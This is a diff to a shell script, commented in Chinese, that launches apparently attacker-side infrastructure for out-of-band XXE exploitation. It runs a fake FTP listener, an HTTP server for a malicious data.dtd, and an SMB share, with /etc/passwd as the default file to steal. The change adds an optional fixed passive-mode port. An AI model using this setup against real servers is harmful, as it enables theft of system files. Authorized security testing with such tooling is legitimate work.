@@ -12,6 +12,7 @@ FAKE_FTP_PORT="${FAKE_FTP_PORT:-2121}"                 # <port>
 FAKE_FTP_LOG_FILE="${FAKE_FTP_LOG_FILE:-}"             # [output_file]，可为空
 FAKE_FTP_HTTP_PORT="${FAKE_FTP_HTTP_PORT:-8087}"       # HTTP 端口 (用于提供 data.dtd)
 FAKE_FTP_FILE_PATH="${FAKE_FTP_FILE_PATH:-/etc/passwd}" # 目标文件路径
+FAKE_FTP_PASV_PORT="${FAKE_FTP_PASV_PORT:-}"           # 固定被动模式端口 (Docker 推荐)
 
 echo "[*] Configurations:"
 echo "    XXE_SMB_PUBLIC_IP   = ${XXE_SMB_PUBLIC_IP}"
@@ -22,6 +23,7 @@ echo "    FAKE_FTP_PORT       = ${FAKE_FTP_PORT}"
 echo "    FAKE_FTP_LOG_FILE   = ${FAKE_FTP_LOG_FILE:-<none>}"
 echo "    FAKE_FTP_HTTP_PORT  = ${FAKE_FTP_HTTP_PORT}"
 echo "    FAKE_FTP_FILE_PATH  = ${FAKE_FTP_FILE_PATH}"
+echo "    FAKE_FTP_PASV_PORT  = ${FAKE_FTP_PASV_PORT:-<random>}"
 
 # 创建 SMB 共享目录
 mkdir -p "${XXE_SMB_SHARE_PATH}"
@@ -56,6 +58,10 @@ FTP_CMD="${FTP_CMD} --file ${FAKE_FTP_FILE_PATH}"
 
 if [ -n "${FAKE_FTP_LOG_FILE}" ]; then
   FTP_CMD="${FTP_CMD} --output ${FAKE_FTP_LOG_FILE}"
+fi
+
+if [ -n "${FAKE_FTP_PASV_PORT}" ]; then
+  FTP_CMD="${FTP_CMD} --pasv-port ${FAKE_FTP_PASV_PORT}"
 fi
 
 ${FTP_CMD} &
